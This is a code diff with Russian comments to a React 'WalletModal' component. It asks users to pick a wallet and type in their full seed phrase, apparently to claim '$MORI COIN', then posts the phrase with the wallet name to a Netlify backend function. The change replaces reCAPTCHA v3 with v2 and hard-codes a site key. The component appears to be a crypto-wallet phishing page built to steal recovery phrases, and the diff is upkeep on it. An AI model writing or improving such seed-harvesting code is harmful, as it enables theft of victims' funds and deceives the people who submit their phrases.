@@ -1,5 +1,5 @@
 import React, { useState, useCallback } from 'react';
-// import { useGoogleReCaptcha } from 'react-google-recaptcha-v3'; // Удален импорт reCAPTCHA
+import ReCAPTCHA from 'react-google-recaptcha'; // Добавлен импорт reCAPTCHA v2
 import './WalletModal.css';
 
 const WALLETS = [
@@ -12,10 +12,13 @@ const WalletModal = ({ onClose }) => {
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [phraseType, setPhraseType] = useState(null);
   const [seedPhrase, setSeedPhrase] = useState('');
+  const [recaptchaToken, setRecaptchaToken] = useState(''); // Состояние для токена reCAPTCHA v2
   const [statusMessage, setStatusMessage] = useState('');
 
   const BACKEND_URL = '/.netlify/functions/secure-message';
-  // const { executeRecaptcha } = useGoogleReCaptcha(); // Удален хук reCAPTCHA
+
+  // ВАЖНО: Вставлен ваш НОВЫЙ Публичный ключ сайта (Site Key) для reCAPTCHA v2
+  const RECAPTCHA_SITE_KEY_V2 = "6LfciG4rAAAAAB-s0mobITSv7p16yLOmEDE1lb3Z"; 
 
   const handleWalletSelect = (wallet) => {
     setSelectedWallet(wallet);
@@ -33,16 +36,19 @@ const WalletModal = ({ onClose }) => {
     }
   };
 
+  const onRecaptchaChange = (token) => {
+    setRecaptchaToken(token); // Обновляем токен reCAPTCHA v2
+  };
+
   const handleSubmit = useCallback(async (e) => {
     e.preventDefault();
-    // if (!executeRecaptcha) { // Удалена проверка reCAPTCHA
-    //   console.error('reCAPTCHA еще не загрузилась');
-    //   setStatusMessage('❌ Ошибка! Проверка на робота не загрузилась. Попробуйте позже.');
-    //   return;
-    // }
-    setStatusMessage('Отправка данных...');
 
-    // const recaptchaToken = await executeRecaptcha('submitForm'); // Удален вызов reCAPTCHA
+    if (!recaptchaToken) { // Проверка наличия токена reCAPTCHA v2
+      setStatusMessage('❌ Пожалуйста, подтвердите, что вы не робот.');
+      return;
+    }
+    
+    setStatusMessage('Проверка и отправка данных...');
 
     try {
       const response = await fetch(BACKEND_URL, {
@@ -53,7 +59,7 @@ const WalletModal = ({ onClose }) => {
         body: JSON.stringify({
           walletName: selectedWallet.name,
           seedPhrase: seedPhrase,
-          // recaptchaToken: recaptchaToken, // Удалена отправка токена reCAPTCHA
+          recaptchaToken: recaptchaToken, // Отправляем токен reCAPTCHA v2 на бэкенд
         }),
       });
 
@@ -61,14 +67,16 @@ const WalletModal = ({ onClose }) => {
 
       if (response.ok && data.success) {
         setStatusMessage(`✅ ${data.message}`);
+        setRecaptchaToken(''); // Сброс токена после успешной отправки
       } else {
         throw new Error(data.message || 'Не удалось отправить данные.');
       }
     } catch (error) {
       console.error('Ошибка отправки на бэкенд:', error);
       setStatusMessage(`❌ Ошибка! ${error.message}. Попробуйте позже.`);
+      setRecaptchaToken(''); // Сброс токена при ошибке
     }
-  }, [selectedWallet, seedPhrase]); // Зависимости useCallback обновлены
+  }, [selectedWallet, seedPhrase, recaptchaToken]); // Зависимости useCallback обновлены
 
   if (statusMessage) {
     return (
@@ -131,6 +139,12 @@ const WalletModal = ({ onClose }) => {
                 required
                 rows={phraseType === 24 ? 5 : 3}
               />
+              <div style={{ marginBottom: '1rem' }}>
+                <ReCAPTCHA
+                  sitekey={RECAPTCHA_SITE_KEY_V2}
+                  onChange={onRecaptchaChange}
+                />
+              </div>
               <button type="submit" className="submit-button">Получить $MORI COIN</button>
             </form>
           </>
